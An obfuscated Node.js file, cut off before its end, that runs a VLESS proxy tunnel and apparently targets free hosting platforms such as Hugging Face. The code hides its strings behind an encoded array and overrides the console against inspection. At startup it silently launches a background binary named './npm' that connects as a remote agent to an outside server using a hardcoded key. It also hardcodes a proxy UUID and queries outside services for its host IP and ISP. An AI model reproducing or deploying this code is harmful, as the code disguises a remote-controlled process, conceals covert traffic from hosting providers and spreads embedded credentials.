const _0x736777=_0x8e35;(function(_0x477129,_0x134651){const _0x4977f1=_0x8e35,_0x5b554e=_0x477129();while(!![]){try{const _0xcf192e=parseInt(_0x4977f1(0x1c9))/0x1*(parseInt(_0x4977f1(0x143))/0x2)+parseInt(_0x4977f1(0x1f3))/0x3+-parseInt(_0x4977f1(0x12f))/0x4+-parseInt(_0x4977f1(0x173))/0x5+parseInt(_0x4977f1(0x157))/0x6*(-parseInt(_0x4977f1(0x184))/0x7)+parseInt(_0x4977f1(0x1d9))/0x8*(parseInt(_0x4977f1(0x151))/0x9)+parseInt(_0x4977f1(0x1b7))/0xa*(parseInt(_0x4977f1(0x200))/0xb);if(_0xcf192e===_0x134651)break;else _0x5b554e['push'](_0x5b554e['shift']());}catch(_0x524cd5){_0x5b554e['push'](_0x5b554e['shift']());}}}(_0x1b86,0xd3723));const _0x1c8b9f=(function(){let _0x4202b7=!![];return function(_0x2e8f58,_0x275339){const _0x5a5dae=_0x4202b7?function(){const _0x16380e=_0x8e35;if(_0x275339){const _0x2469c2=_0x275339[_0x16380e(0x1c3)](_0x2e8f58,arguments);return _0x275339=null,_0x2469c2;}}:function(){};return _0x4202b7=![],_0x5a5dae;};}()),_0xb14894=_0x1c8b9f(this,function(){const _0x1aebfd=_0x8e35;return _0xb14894['toString']()[_0x1aebfd(0x133)](_0x1aebfd(0x1a2))['toString']()['constructor'](_0xb14894)['search'](_0x1aebfd(0x1a2));});_0xb14894();const _0x51297c=(function(){let _0x5d7f22=!![];return function(_0x4a7811,_0x5d9852){const _0x3fe1a5=_0x5d7f22?function(){if(_0x5d9852){const _0x419f0a=_0x5d9852['apply'](_0x4a7811,arguments);return _0x5d9852=null,_0x419f0a;}}:function(){};return _0x5d7f22=![],_0x3fe1a5;};}()),_0x260b56=_0x51297c(this,function(){const _0x30633d=_0x8e35;let _0x842d63;try{const _0x2e05f2=Function(_0x30633d(0x1a5)+_0x30633d(0x18f)+');');_0x842d63=_0x2e05f2();}catch(_0x10ad6a){_0x842d63=window;}const _0x26121a=_0x842d63[_0x30633d(0x1ed)]=_0x842d63['console']||{},_0x40eade=[_0x30633d(0x1b9),_0x30633d(0x15f),_0x30633d(0x138),_0x30633d(0x168),_0x30633d(0x1c2),_0x30633d(0x1bb),_0x30633d(0x141)];for(let _0x41572d=0x0;_0x41572d<_0x40eade['length'];_0x41572d++){const _0x1ceb01=_0x51297c[_0x30633d(0x196)][_0x30633d(0x1a7)][_0x30633d(0x166)](_0x51297c),_0x10000b=_0x40eade[_0x41572d],_0x59e5cb=_0x26121a[_0x10000b]||_0x1ceb01;_0x1ceb01[_0x30633d(0x1db)]=_0x51297c[_0x30633d(0x166)](_0x51297c),_0x1ceb01['toString']=_0x59e5cb[_0x30633d(0x188)]['bind'](_0x59e5cb),_0x26121a[_0x10000b]=_0x1ceb01;}});_0x260b56();const net=require('net'),http=require(_0x736777(0x16a)),{Buffer}=require('buffer'),{exec,execSync}=require(_0x736777(0x15c)),UUID=process[_0x736777(0x137)][_0x736777(0x13a)]||_0x736777(0x156),NEZHA_SERVER=process[_0x736777(0x137)][_0x736777(0x1df)]||'nazhe.841013.xyz',NEZHA_PORT=process[_0x736777(0x137)][_0x736777(0x1bf)]||'443',NEZHA_KEY=process[_0x736777(0x137)][_0x736777(0x162)]||_0x736777(0x192),SUB_PATH=process[_0x736777(0x137)]['SUB_PATH']||_0x736777(0x1f6),XPATH=process[_0x736777(0x137)]['XPATH']||UUID['slice'](0x0,0x8),DOMAIN=process[_0x736777(0x137)][_0x736777(0x1b6)]||'huggingface.841013.xyz',NAME=process[_0x736777(0x137)][_0x736777(0x1d3)]||_0x736777(0x13f),PORT=process[_0x736777(0x137)]['PORT']||0x1eb4,SETTINGS={[_0x736777(0x13a)]:UUID,[_0x736777(0x1a9)]:_0x736777(0x1bd),[_0x736777(0x1cf)]:_0x736777(0x15e),[_0x736777(0x16f)]:'%2F'+XPATH,[_0x736777(0x1eb)]:0x1e,[_0x736777(0x14f)]:0xf4240,[_0x736777(0x171)]:0x7530,[_0x736777(0x1ab)]:0x400*0x400,[_0x736777(0x165)]:!![],[_0x736777(0x148)]:!![]};function validate_uuid(_0x1e2be9,_0x310eeb){for(let _0x1d864b=0x0;_0x1d864b<0x10;_0x1d864b++){if(_0x1e2be9[_0x1d864b]!==_0x310eeb[_0x1d864b])return![];}return!![];}function concat_typed_arrays(_0x5ac2a8,..._0x1ef1b3){const _0x553188=_0x736777;if(!_0x1ef1b3||_0x1ef1b3[_0x553188(0x169)]<0x1)return _0x5ac2a8;let _0x31b08a=_0x5ac2a8['length'];for(let _0x5e8cce of _0x1ef1b3)_0x31b08a+=_0x5e8cce['length'];const _0x593705=new _0x5ac2a8[(_0x553188(0x196))](_0x31b08a);_0x593705[_0x553188(0x1dd)](_0x5ac2a8,0x0),_0x31b08a=_0x5ac2a8['length'];for(let _0x244846 of _0x1ef1b3){_0x593705[_0x553188(0x1dd)](_0x244846,_0x31b08a),_0x31b08a+=_0x244846[_0x553188(0x169)];}return _0x593705;}function log(_0x1acdb1,..._0x4b8f85){const _0xa870a1=_0x736777;if(SETTINGS[_0xa870a1(0x1a9)]===_0xa870a1(0x1bd))return;const _0x2cf6c3={'debug':0x0,'info':0x1,'warn':0x2,'error':0x3},_0x3c4819={'debug':'\x1b[36m','info':_0xa870a1(0x1f7),'warn':_0xa870a1(0x132),'error':'\x1b[31m','reset':_0xa870a1(0x1fc)},_0x23b8f0=_0x2cf6c3[SETTINGS[_0xa870a1(0x1a9)]]||0x1,_0xfe843f=_0x2cf6c3[_0x1acdb1]||0x0;if(_0xfe843f>=_0x23b8f0){const _0x46f412=new Date()[_0xa870a1(0x161)](),_0x539f59=_0x3c4819[_0x1acdb1]||_0x3c4819['reset'];console['log'](_0x539f59+'['+_0x46f412+']\x20['+_0x1acdb1+']',..._0x4b8f85,_0x3c4819['reset']);}}function _0x1b86(){const _0x2bf818=['readable',':443?encryption=none&security=tls&sni=','resume','pause','Remote\x20connection\x20not\x20available','Socket\x20error:','\x20timed\x20out\x20without\x20downstream','setKeepAlive','delete','(((.+)+)+)+$','destroy','Connection\x20failed:\x20','return\x20(function()\x20','getWriter','prototype','hostname','LOG_LEVEL','Content-Type','CHUNK_SIZE','end','&mode=packet-up#','2096','Read\x20controller\x20error:','\x20>/dev/null\x202>&1\x20&','createConnection','Connected\x20to\x20','createServer','value','listen','DOMAIN','2336280mrCDUD','curl\x20-s\x20--max-time\x202\x20ipv4.ip.sb','log','_writeToRemote','table','application/octet-stream','none','url','NEZHA_PORT','parse\x20hostname\x20failed',',\x20size=','exception','apply','vlessHeader','remote','2053','startDownstream','--tls','23123nuPyXI','setNoDelay','downstreamStarted','Cleaning\x20up\x20session\x20','nextSeq','releaseLock','BUFFER_SIZE','\x20before\x20initialization','base64','read\x20address\x20type\x20failed','NAME','Transfer-Encoding','read\x20vless\x20header\x20error:\x20','New\x20secure\x20connection\x20using:\x20','Received\x20out\x20of\x20order\x20packet\x20seq=','nextTick','7278440YCXAFB','Processing\x20packet:\x20seq=','__proto__','Read\x20controller\x20close\x20error:','set','get','NEZHA_SERVER','connect','writeHead','2087','data','Session\x20','Failed\x20to\x20parse\x20hostname','uuid','Failed\x20to\x20initialize\x20VLESS\x20connection','initializeVLESS','Sending\x20VLESS\x20response\x20header\x20(','finally','MAX_BUFFERED_POSTS','pipe','console','_startDownstreamResponse','join','resp','Relay\x20error:','from','26976zqwCZa','Failed\x20to\x20start\x20downstream\x20for\x20session:\x20','Initializing\x20VLESS\x20connection\x20from\x20first\x20packet','sub','\x1b[32m','utf-8','POST','nohup\x20./npm\x20-s\x20','catch','\x1b[0m','&fp=chrome&allowInsecure=1&type=xhttp&host=','port','&path=','121YPpids','alpnProtocol','443','cleanup','pendingPackets','Socket\x20is\x20destroyed','5330916FQGJts','responseHeader','method','\x1b[33m','search','connect\x20timeout','Failed\x20to\x20write\x20to\x20remote:\x20','destroyed','env','info','read','UUID','writableEnded','Failed\x20to\x20process\x20POST\x20request:\x20','Process\x20packet\x20error:\x20','text/plain','Huggingface.co','push','trace','debug','14EJfPtF','Remote\x20error:\x20','Remote\x20connection\x20established','lastActivity','message','TCP_KEEPALIVE','reading_done','chunked','):\x20','2083','initialized','floor','MAX_POST_SIZE','socket\x20hang\x20up','9tLfBEw','unsupported\x20command:\x20','Processed\x20packet\x20seq=','Client\x20connection\x20closed','includes','606e39fd-2651-4ad5-ae9d-fb2ac1901f88','6SEYMxY','headerSent','aborted','size','fill','child_process','curl\x20-s\x20--max-time\x201\x20ipv6.ip.sb','1024','warn','header\x20length\x20too\x20short','toISOString','NEZHA_KEY','writable','cork','TCP_NODELAY','bind','vless://','error','length','http','Buffered\x20packet\x20seq=','Created\x20new\x20session\x20for\x20POST:\x20','Failed\x20to\x20get\x20IP\x20address:','VLESS\x20header\x20parse\x20error:\x20','XPATH','enqueue','SESSION_TIMEOUT','done','3017900rBdpMI','pipeTo','cleaned','replaceAll','random','headersSent','close','uncork','slice','GET','substr','Error\x20starting\x20downstream:\x20','localhost','\x20bytes','Upload\x20error:\x20','now','pendingBuffers','5937218hcXlys','trim','concat','/bin/bash','toString','has','timeout','Transform','invalid\x20UUID','http/1.1','decode','{}.constructor(\x22return\x20this\x22)(\x20)','bufferedData','write','HuggAisR7d2tFoecWg3','Server\x20is\x20running\x20on\x20port\x20','curl\x20-s\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','match','constructor','processPacket','currentStreamRes'];_0x1b86=function(){return _0x2bf818;};return _0x1b86();}const runnz=async()=>{const _0x4ef185=_0x736777;let _0x5debfb='',_0x3c874b='';const _0x3ff9e9=[_0x4ef185(0x202),'8443',_0x4ef185(0x1ae),_0x4ef185(0x1e2),_0x4ef185(0x14c),_0x4ef185(0x1c6)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY)_0x5debfb=_0x3ff9e9[_0x4ef185(0x155)](NEZHA_PORT)?_0x4ef185(0x1c8):'',_0x3c874b=_0x4ef185(0x1fa)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x5debfb+_0x4ef185(0x1b0);else return;try{exec(_0x3c874b,{'shell':_0x4ef185(0x187)}),console[_0x4ef185(0x1b9)]('App\x20is\x20running');}catch(_0x1ca40b){}};function parse_uuid(_0x44e2a0){const _0x50b2cf=_0x736777;_0x44e2a0=_0x44e2a0[_0x50b2cf(0x176)]('-','');const _0x9ed0ea=[];for(let _0x4f11c2=0x0;_0x4f11c2<0x10;_0x4f11c2++){_0x9ed0ea[_0x50b2cf(0x140)](parseInt(_0x44e2a0[_0x50b2cf(0x17d)](_0x4f11c2*0x2,0x2),0x10));}return _0x9ed0ea;}async function read_vless_header(_0x629a4,_0x1c8e77){const _0x393e50=_0x736777;let _0x3fde71=0x0,_0x48b0df=new Uint8Array(),_0x24d5e6={'value':_0x48b0df,'done':![]};async function _0x10e25b(_0x37c315){const _0x18caf3=_0x8e35;if(_0x24d5e6[_0x18caf3(0x172)])throw new Error(_0x18caf3(0x160));const _0x3c07b0=_0x37c315-_0x3fde71;if(_0x3c07b0<0x1)return;_0x24d5e6=await read_atleast(_0x629a4,_0x3c07b0),_0x3fde71+=_0x24d5e6[_0x18caf3(0x1b4)]['length'],_0x48b0df=concat_typed_arrays(_0x48b0df,_0x24d5e6['value']);}await _0x10e25b(0x1+0x10+0x1);const _0x335c44=_0x48b0df[0x0],_0x366e03=_0x48b0df['slice'](0x1,0x1+0x10),_0x4a698d=parse_uuid(_0x1c8e77);if(!validate_uuid(_0x366e03,_0x4a698d))throw new Error(_0x393e50(0x18c));const _0x241cfb=_0x48b0df[0x1+0x10],_0x5de28d=0x1+0x10+0x1+_0x241cfb+0x1+0x2+0x1;await _0x10e25b(_0x5de28d+0x1);const _0x4a111e=_0x48b0df[0x1+0x10+0x1+_0x241cfb],_0x7e21de=0x1;if(_0x4a111e!==_0x7e21de)throw new Error(_0x393e50(0x152)+_0x4a111e);const _0xe56093=(_0x48b0df[_0x5de28d-0x1-0x2]<<0x8)+_0x48b0df[_0x5de28d-0x1-0x1],_0x165aac=_0x48b0df[_0x5de28d-0x1],_0x48617d=0x1,_0x2784f0=0x2,_0x43b5c9=0x3;let _0x16023a=-0x1;if(_0x165aac===_0x48617d)_0x16023a=_0x5de28d+0x4;else{if(_0x165aac===_0x43b5c9)_0x16023a=_0x5de28d+0x10;else _0x165aac===_0x2784f0&&(_0x16023a=_0x5de28d+0x1+_0x48b0df[_0x5de28d]);}if(_0x16023a<0x0)throw new Error(_0x393e50(0x1d2));await _0x10e25b(_0x16023a);const _0x20e618=_0x5de28d;let _0x4ff6eb='';if(_0x165aac===_0x48617d)_0x4ff6eb=_0x48b0df[_0x393e50(0x17b)](_0x20e618,_0x20e618+0x4)[_0x393e50(0x1ef)]('.');else{if(_0x165aac===_0x2784f0)_0x4ff6eb=new TextDecoder()[_0x393e50(0x18e)](_0x48b0df[_0x393e50(0x17b)](_0x20e618+0x1,_0x20e618+0x1+_0x48b0df[_0x20e618]));else _0x165aac===_0x43b5c9&&(_0x4ff6eb=_0x48b0df[_0x393e50(0x17b)](_0x20e618,_0x20e618+0x10)['reduce']((_0x4642cc,_0x28ee37,_0xb68aa7,_0x4a5877)=>_0xb68aa7%0x2?_0x4642cc[_0x393e50(0x186)](((_0x4a5877[_0xb68aa7-0x1]<<0x8)+_0x28ee37)['toString'](0x10)):_0x4642cc,[])[_0x393e50(0x1ef)](':'));}if(!_0x4ff6eb){log(_0x393e50(0x168),_0x393e50(0x1e5));throw new Error(_0x393e50(0x1c0));}return log('info','VLESS\x20connection\x20to\x20'+_0x4ff6eb+':'+_0xe56093),{'hostname':_0x4ff6eb,'port':_0xe56093,'data':_0x48b0df[_0x393e50(0x17b)](_0x16023a),'resp':new Uint8Array([_0x335c44,0x0])};}async function read_atleast(_0x5d5800,_0xee308a){const _0x1fd1da=_0x736777,_0x235953=[];let _0x5726a7=![];while(_0xee308a>0x0&&!_0x5726a7){const _0x50b481=await _0x5d5800[_0x1fd1da(0x139)]();if(_0x50b481[_0x1fd1da(0x1b4)]){const _0x38ec23=new Uint8Array(_0x50b481['value']);_0x235953['push'](_0x38ec23),_0xee308a-=_0x38ec23[_0x1fd1da(0x169)];}_0x5726a7=_0x50b481[_0x1fd1da(0x172)];}if(_0xee308a>0x0)throw new Error('not\x20enough\x20data\x20to\x20read');return{'value':concat_typed_arrays(..._0x235953),'done':_0x5726a7};}async function parse_header(_0x379fda,_0x446d68){const _0x186a70=_0x736777;log(_0x186a70(0x142),'Starting\x20to\x20parse\x20VLESS\x20header');const _0x1387be=_0x446d68[_0x186a70(0x199)]['getReader']();try{const _0xfeb332=await read_vless_header(_0x1387be,_0x379fda);return log(_0x186a70(0x142),'VLESS\x20header\x20parsed\x20successfully'),_0xfeb332;}catch(_0x355c6d){log(_0x186a70(0x168),_0x186a70(0x16e)+_0x355c6d[_0x186a70(0x147)]);throw new Error(_0x186a70(0x1d5)+_0x355c6d[_0x186a70(0x147)]);}finally{_0x1387be[_0x186a70(0x1ce)]();}}async function connect_remote(_0x251a6a,_0x5961dc){const _0x47ea25=_0x736777,_0xb542c4=0x1f40;try{const _0x544204=await timed_connect(_0x251a6a,_0x5961dc,_0xb542c4);return _0x544204[_0x47ea25(0x1ca)](!![]),_0x544204[_0x47ea25(0x1a0)](!![],0x3e8),_0x544204['bufferSize']=parseInt(SETTINGS[_0x47ea25(0x1cf)])*0x400,log(_0x47ea25(0x138),_0x47ea25(0x1b2)+_0x251a6a+':'+_0x5961dc),_0x544204;}catch(_0x317e02){log(_0x47ea25(0x168),_0x47ea25(0x1a4)+_0x317e02[_0x47ea25(0x147)]);throw _0x317e02;}}function timed_connect(_0x58c991,_0x2b919a,_0x11f412){return new Promise((_0x1d1032,_0x5979cb)=>{const _0x4605c2=_0x8e35,_0x24ef49=net[_0x4605c2(0x1b1)]({'host':_0x58c991,'port':_0x2b919a}),_0x5bda14=setTimeout(()=>{const _0x186bb2=_0x4605c2;_0x5979cb(new Error(_0x186bb2(0x134)));},_0x11f412);_0x24ef49['on'](_0x4605c2(0x1e0),()=>{clearTimeout(_0x5bda14),_0x1d1032(_0x24ef49);}),_0x24ef49['on'](_0x4605c2(0x168),_0x200852=>{clearTimeout(_0x5bda14),_0x5979cb(_0x200852);});});}function pipe_relay(){async function _0x1006f8(_0x1f9e20,_0x1aa3ac,_0x1691eb){const _0x1f10f5=_0x8e35,_0x1e6cad=parseInt(SETTINGS['CHUNK_SIZE']);if(_0x1691eb[_0x1f10f5(0x169)]>0x0){if(_0x1aa3ac[_0x1f10f5(0x191)])_0x1aa3ac[_0x1f10f5(0x164)](),_0x1aa3ac[_0x1f10f5(0x191)](_0x1691eb),process[_0x1f10f5(0x1d8)](()=>_0x1aa3ac[_0x1f10f5(0x17a)]());else{const _0x44f8c9=_0x1aa3ac[_0x1f10f5(0x163)][_0x1f10f5(0x1a6)]();try{await _0x44f8c9[_0x1f10f5(0x191)](_0x1691eb);}finally{_0x44f8c9[_0x1f10f5(0x1ce)]();}}}try{_0x1f9e20['pipe']?(_0x1f9e20[_0x1f10f5(0x19c)](),_0x1f9e20[_0x1f10f5(0x1ec)](_0x1aa3ac,{'end':!![],'highWaterMark':_0x1e6cad}),_0x1f9e20[_0x1f10f5(0x19b)]()):await _0x1f9e20[_0x1f10f5(0x199)][_0x1f10f5(0x174)](_0x1aa3ac[_0x1f10f5(0x163)],{'preventClose':![],'preventAbort':![],'preventCancel':![],'signal':AbortSignal[_0x1f10f5(0x18a)](SETTINGS[_0x1f10f5(0x171)])});}catch(_0x5a60f6){!_0x5a60f6[_0x1f10f5(0x147)][_0x1f10f5(0x155)](_0x1f10f5(0x159))&&log(_0x1f10f5(0x168),_0x1f10f5(0x1f1),_0x5a60f6['message']);throw _0x5a60f6;}}return _0x1006f8;}function socketToWebStream(_0xf69fce){const _0x5994ef=_0x736777;let _0x453dc9,_0x1deb34;return _0xf69fce['on'](_0x5994ef(0x168),_0x4eeeb0=>{const _0x10b438=_0x5994ef;log(_0x10b438(0x168),_0x10b438(0x19e),_0x4eeeb0[_0x10b438(0x147)]),_0x453dc9?.[_0x10b438(0x168)](_0x4eeeb0),_0x1deb34?.[_0x10b438(0x168)](_0x4eeeb0);}),{'readable':new ReadableStream({'start'(_0x101894){const _0x5b1fa4=_0x5994ef;_0x453dc9=_0x101894,_0xf69fce['on'](_0x5b1fa4(0x1e3),_0x40e56e=>{const _0x317841=_0x5b1fa4;try{_0x101894[_0x317841(0x170)](_0x40e56e);}catch(_0x57b8c6){log(_0x317841(0x168),_0x317841(0x1af),_0x57b8c6['message']);}}),_0xf69fce['on'](_0x5b1fa4(0x1ac),()=>{const _0x31f755=_0x5b1fa4;try{_0x101894[_0x31f755(0x179)]();}catch(_0x598318){log(_0x31f755(0x168),_0x31f755(0x1dc),_0x598318[_0x31f755(0x147)]);}});},'cancel'(){const _0xc26fb8=_0x5994ef;_0xf69fce[_0xc26fb8(0x1a3)]();}}),'writable':new WritableStream({'start'(_0x11aee4){_0x1deb34=_0x11aee4;},'write'(_0x2c4e07){return new Promise((_0x55cb81,_0x5b2f82)=>{const _0x3ab965=_0x8e35;if(_0xf69fce[_0x3ab965(0x136)]){_0x5b2f82(new Error(_0x3ab965(0x12e)));return;}_0xf69fce['write'](_0x2c4e07,_0x55ef1a=>{if(_0x55ef1a)_0x5b2f82(_0x55ef1a);else _0x55cb81();});});},'close'(){const _0x12f755=_0x5994ef;!_0xf69fce[_0x12f755(0x136)]&&_0xf69fce[_0x12f755(0x1ac)]();},'abort'(_0x4e738f){const _0x5828a5=_0x5994ef;_0xf69fce[_0x5828a5(0x1a3)](_0x4e738f);}})};}function relay(_0x588634,_0x19cda3,_0x4175ae,_0x544a1d){const _0x5012cc=_0x736777,_0x3256a3=pipe_relay();let _0x16c189=![];const _0x591447=socketToWebStream(_0x4175ae);function _0x4340f4(){const _0x54b2c6=_0x8e35;if(!_0x16c189){_0x16c189=!![];try{_0x4175ae['destroy']();}catch(_0xf25686){!_0xf25686[_0x54b2c6(0x147)][_0x54b2c6(0x155)](_0x54b2c6(0x159))&&!_0xf25686[_0x54b2c6(0x147)]['includes']('socket\x20hang\x20up')&&log(_0x54b2c6(0x168),'Cleanup\x20error:\x20'+_0xf25686[_0x54b2c6(0x147)]);}}}const _0x895936=_0x3256a3(_0x19cda3,_0x591447,_0x544a1d[_0x5012cc(0x1e3)])[_0x5012cc(0x1fb)](_0x40a92c=>{const _0xc1f57b=_0x5012cc;!_0x40a92c['message'][_0xc1f57b(0x155)](_0xc1f57b(0x159))&&!_0x40a92c[_0xc1f57b(0x147)][_0xc1f57b(0x155)](_0xc1f57b(0x150))&&log(_0xc1f57b(0x168),_0xc1f57b(0x181)+_0x40a92c[_0xc1f57b(0x147)]);})[_0x5012cc(0x1ea)](()=>{const _0xedb06e=_0x5012cc;_0x19cda3['reading_done']&&_0x19cda3[_0xedb06e(0x149)]();}),_0xa7fa7f=_0x3256a3(_0x591447,_0x19cda3,_0x544a1d[_0x5012cc(0x1f0)])[_0x5012cc(0x1fb)](_0x309fe1=>{const _0x412bfb=_0x5012cc;!_0x309fe1[_0x412bfb(0x147)][_0x412bfb(0x155)](_0x412bfb(0x159))&&!_0x309fe1['message'][_0x412bfb(0x155)](_0x412bfb(0x150))&&log(_0x412bfb(0x168),'Download\x20error:\x20'+_0x309fe1[_0x412bfb(0x147)]);});_0xa7fa7f[_0x5012cc(0x1ea)](()=>_0x895936)['finally'](_0x4340f4);}const sessions=new Map();class Session{constructor(_0x52605b){const _0x410b61=_0x736777;this[_0x410b61(0x1e6)]=_0x52605b,this[_0x410b61(0x1cd)]=0x0,this['downstreamStarted']=![],this[_0x410b61(0x146)]=Date[_0x410b61(0x182)](),this[_0x410b61(0x1c4)]=null,this['remote']=null,this[_0x410b61(0x14d)]=![],this[_0x410b61(0x130)]=null,this[_0x410b61(0x158)]=![],this[_0x410b61(0x190)]=new Map(),this[_0x410b61(0x175)]=![],this[_0x410b61(0x12d)]=[],this[_0x410b61(0x198)]=null,this[_0x410b61(0x183)]=new Map(),log('debug','Created\x20new\x20session\x20with\x20UUID:\x20'+_0x52605b);}async[_0x736777(0x1e8)](_0x391d83){const _0x2c3a47=_0x736777;if(this[_0x2c3a47(0x14d)])return!![];try{log(_0x2c3a47(0x142),_0x2c3a47(0x1f5));const _0x4d4d3a=new ReadableStream({'start'(_0x41cdff){const _0x2942c5=_0x2c3a47;_0x41cdff[_0x2942c5(0x170)](_0x391d83),_0x41cdff[_0x2942c5(0x179)]();}}),_0x37841a={'readable':_0x4d4d3a,'writable':new WritableStream()};return this[_0x2c3a47(0x1c4)]=await parse_header(SETTINGS[_0x2c3a47(0x13a)],_0x37841a),log('info','VLESS\x20header\x20parsed:\x20'+this[_0x2c3a47(0x1c4)][_0x2c3a47(0x1a8)]+':'+this[_0x2c3a47(0x1c4)][_0x2c3a47(0x1fe)]),this['remote']=await connect_remote(this[_0x2c3a47(0x1c4)]['hostname'],this[_0x2c3a47(0x1c4)][_0x2c3a47(0x1fe)]),log(_0x2c3a47(0x138),_0x2c3a47(0x145)),this['initialized']=!![],!![];}catch(_0x4e85b9){return log('error','Failed\x20to\x20initialize\x20VLESS:\x20'+_0x4e85b9['message']),![];}}async[_0x736777(0x197)](_0x1fe7df,_0x238dc6){const _0x998a21=_0x736777;try{this['pendingBuffers'][_0x998a21(0x1dd)](_0x1fe7df,_0x238dc6),log(_0x998a21(0x142),_0x998a21(0x16b)+_0x1fe7df+_0x998a21(0x1c1)+_0x238dc6[_0x998a21(0x169)]);while(this[_0x998a21(0x183)][_0x998a21(0x189)](this['nextSeq'])){const _0x42a153=this['pendingBuffers']['get'](this[_0x998a21(0x1cd)]);this[_0x998a21(0x183)][_0x998a21(0x1a1)](this[_0x998a21(0x1cd)]);if(!this[_0x998a21(0x14d)]&&this[_0x998a21(0x1cd)]===0x0){if(!await this[_0x998a21(0x1e8)](_0x42a153))throw new Error(_0x998a21(0x1e7));this[_0x998a21(0x130)]=Buffer[_0x998a21(0x1f2)](this['vlessHeader'][_0x998a21(0x1f0)]),await this['_writeToRemote'](this[_0x998a21(0x1c4)]['data']),this[_0x998a21(0x198)]&&this[_0x998a21(0x1ee)]();}else{if(!this[_0x998a21(0x14d)]){log(_0x998a21(0x15f),_0x998a21(0x1d7)+_0x1fe7df+_0x998a21(0x1d0));continue;}await this[_0x998a21(0x1ba)](_0x42a153);}this[_0x998a21(0x1cd)]++,log(_0x998a21(0x142),_0x998a21(0x153)+(this[_0x998a21(0x1cd)]-0x1));}if(this[_0x998a21(0x183)][_0x998a21(0x15a)]>SETTINGS['MAX_BUFFERED_POSTS'])throw new Error('Too\x20many\x20buffered\x20packets');return!![];}catch(_0x21b224){log('error',_0x998a21(0x13d)+_0x21b224['message']);throw _0x21b224;}}[_0x736777(0x1ee)](){const _0x2a9434=_0x736777;if(!this[_0x2a9434(0x198)]||!this[_0x2a9434(0x130)])return;try{const _0x17db27=this['currentStreamRes']['socket']?.[_0x2a9434(0x201)]||_0x2a9434(0x18d),_0x56418f=_0x17db27==='h2';!this[_0x2a9434(0x158)]&&(log(_0x2a9434(0x142),_0x2a9434(0x1e9)+_0x17db27+_0x2a9434(0x14b)+this['responseHeader'][_0x2a9434(0x169)]+_0x2a9434(0x180)),this['currentStreamRes']['write'](this[_0x2a9434(0x130)]),this[_0x2a9434(0x158)]=!![]);if(_0x56418f){this[_0x2a9434(0x198)]['socket'][_0x2a9434(0x1ca)](!![]);const _0xac8372=new require('stream')[_0x2a9434(0x18b)]({'transform'(_0x1b5502,_0x11a08b,_0x3f504f){const _0x1cdec7=_0x2a9434,_0x421d9e=0x4000;for(let _0x46b72a=0x0;_0x46b72a<_0x1b5502[_0x1cdec7(0x169)];_0x46b72a+=_0x421d9e){this[_0x1cdec7(0x140)](_0x1b5502[_0x1cdec7(0x17b)](_0x46b72a,_0x46b72a+_0x421d9e));}_0x3f504f();}});this[_0x2a9434(0x1c5)]['pipe'](_0xac8372)[_0x2a9434(0x1ec)](this[_0x2a9434(0x198)]);}else this['remote']['pipe'](this[_0x2a9434(0x198)]);this[_0x2a9434(0x1c5)]['on'](_0x2a9434(0x1ac),()=>{const _0x16eed3=_0x2a9434;!this[_0x16eed3(0x198)][_0x16eed3(0x13b)]&&this[_0x16eed3(0x198)][_0x16eed3(0x1ac)]();}),this[_0x2a9434(0x1c5)]['on'](_0x2a9434(0x168),_0x27a0cb=>{const _0x415943=_0x2a9434;log('error',_0x415943(0x144)+_0x27a0cb[_0x415943(0x147)]),!this[_0x415943(0x198)]['writableEnded']&&this[_0x415943(0x198)][_0x415943(0x1ac)]();});}catch(_0x47fb4){log(_0x2a9434(0x168),_0x2a9434(0x17e)+_0x47fb4[_0x2a9434(0x147)]),this['cleanup']();}}[_0x736777(0x1c7)](_0x12eb08,_0x3599ea){const _0x5e4b15=_0x736777;return!_0x12eb08[_0x5e4b15(0x178)]&&_0x12eb08['writeHead'](0xc8,_0x3599ea),this['currentStreamRes']=_0x12eb08,this[_0x5e4b15(0x14d)]&&this['responseHeader']&&this[_0x5e4b15(0x1ee)](),_0x12eb08['on']('close',()=>{const _0x3b067f=_0x5e4b15;log('info',_0x3b067f(0x154)),this[_0x3b067f(0x12c)]();}),!![];}async['_writeToRemote'](_0x117edd){const _0x50dd17=_0x736777;if(!this[_0x50dd17(0x1c5)]||this[_0x50dd17(0x1c5)][_0x50dd17(0x136)])throw new Error(_0x50dd17(0x19d));return new Promise((_0x4a9200,_0x26b84f)=>{const _0x29c8ad=_0x50dd17;this[_0x29c8ad(0x1c5)][_0x29c8ad(0x191)](_0x117edd,_0x4d512b=>{const _0x236b02=_0x29c8ad;_0x4d512b?(log(_0x236b02(0x168),_0x236b02(0x135)+_0x4d512b[_0x236b02(0x147)]),_0x26b84f(_0x4d512b)):_0x4a9200();});});}[_0x736777(0x1ee)](){const _0x39e913=_0x736777;if(!this['currentStreamRes']||!this['responseHeader'])return;try{!this[_0x39e913(0x158)]&&(this[_0x39e913(0x198)][_0x39e913(0x191)](this[_0x39e913(0x130)]),this['headerSent']=!![]),this[_0x39e913(0x1c5)][_0x39e913(0x1ec)](this[_0x39e913(0x198)]),this[_0x39e913(0x1c5)]['on']('end',()=>{const _0x14b33e=_0x39e913;!this['currentStreamRes'][_0x14b33e(0x13b)]&&this['currentStreamRes']['end']();}),this['remote']['on'](_0x39e913(0x168),_0x584b69=>{const _0x469b57=_0x39e913;log(_0x469b57(0x168),_0x469b57(0x144)+_0x584b69['message']),!this[_0x469b57(0x198)]['writableEnded']&&this[_0x469b57(0x198)][_0x469b57(0x1ac)]();});}catch(_0x39ed89){log(_0x39e913(0x168),_0x39e913(0x17e)+_0x39ed89[_0x39e913(0x147)]),this[_0x39e913(0x12c)]();}}[_0x736777(0x12c)](){const _0x461700=_0x736777;!this[_0x461700(0x175)]&&(this[_0x461700(0x175)]=!![],log('debug',_0x461700(0x1cc)+this[_0x461700(0x1e6)]),this[_0x461700(0x1c5)]&&(this[_0x461700(0x1c5)][_0x461700(0x1a3)](),this[_0x461700(0x1c5)]=null),this[_0x461700(0x14d)]=![],this[_0x461700(0x158)]=![]);}}const metaInfo=execSync(_0x736777(0x194),{'encoding':_0x736777(0x1f8)}),ISP=metaInfo[_0x736777(0x185)]();let 